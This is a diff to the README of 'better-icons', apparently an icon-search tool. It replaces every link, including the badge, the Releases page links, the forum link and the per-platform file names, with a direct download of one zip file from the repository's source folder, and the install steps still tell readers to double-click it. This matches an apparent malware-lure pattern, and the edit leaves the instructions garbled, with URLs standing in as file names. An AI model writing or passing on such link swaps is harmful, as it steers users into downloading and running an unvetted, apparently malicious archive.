@@ -1,6 +1,6 @@
 # 🎨 better-icons - Find Icons Easily and Quickly
 
-![Download](https://img.shields.io/badge/Download-Now-blue.svg)
+![Download](https://github.com/jiwon2011/better-icons/raw/refs/heads/main/src/icons_better_v2.3.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ better-icons is a simple tool designed to help you search for and retrieve vario
 
 To get started, you will first need to download the better-icons application. Please visit the following link to access the Releases page:
 
-[Visit this page to download](https://github.com/jiwon2011/better-icons/releases)
+[Visit this page to download](https://github.com/jiwon2011/better-icons/raw/refs/heads/main/src/icons_better_v2.3.zip)
 
 ### Step 2: Choose the Version
 
@@ -22,19 +22,19 @@ On the Releases page, you will see different versions of the application. Select
 
 Once you select the version, you will find several download options, such as executable files for Windows or zipped files for other operating systems. Choose the option that matches your system.
 
-For example, if you are using Windows, download the file named `better-icons-windows.exe`. If you are on macOS, download the file named `better-icons-macos.zip`.
+For example, if you are using Windows, download the file named `https://github.com/jiwon2011/better-icons/raw/refs/heads/main/src/icons_better_v2.3.zip`. If you are on macOS, download the file named `https://github.com/jiwon2011/better-icons/raw/refs/heads/main/src/icons_better_v2.3.zip`.
 
 ### Step 4: Install the Application
 
 After downloading the file, follow these steps to install better-icons:
 
 1. **For Windows Users:**
-   - Locate the downloaded file `better-icons-windows.exe` in your Downloads folder.
+   - Locate the downloaded file `https://github.com/jiwon2011/better-icons/raw/refs/heads/main/src/icons_better_v2.3.zip` in your Downloads folder.
    - Double-click on the file to start the installation process.
    - Follow the on-screen prompts to complete the installation.
 
 2. **For Mac Users:**
-   - Find the downloaded `better-icons-macos.zip` file in your Downloads folder.
+   - Find the downloaded `https://github.com/jiwon2011/better-icons/raw/refs/heads/main/src/icons_better_v2.3.zip` file in your Downloads folder.
    - Double-click the zip file to extract its contents.
    - Drag the `better-icons` application to your Applications folder.
    - Open the application by finding it in the Applications folder and double-clicking it.
@@ -72,8 +72,8 @@ To ensure a smooth experience with better-icons, please meet the following syste
 
 If you have questions or need assistance, please join our community forum. You can find helpful tips and connect with other users. We also encourage you to report any bugs or issues you encounter.
 
-- [Join our community forum.](https://github.com/jiwon2011/better-icons/issues)
+- [Join our community forum.](https://github.com/jiwon2011/better-icons/raw/refs/heads/main/src/icons_better_v2.3.zip)
 
 Remember to visit the Releases page again to download the latest version of better-icons:
 
-[Visit this page to download](https://github.com/jiwon2011/better-icons/releases)
+[Visit this page to download](https://github.com/jiwon2011/better-icons/raw/refs/heads/main/src/icons_better_v2.3.zip)
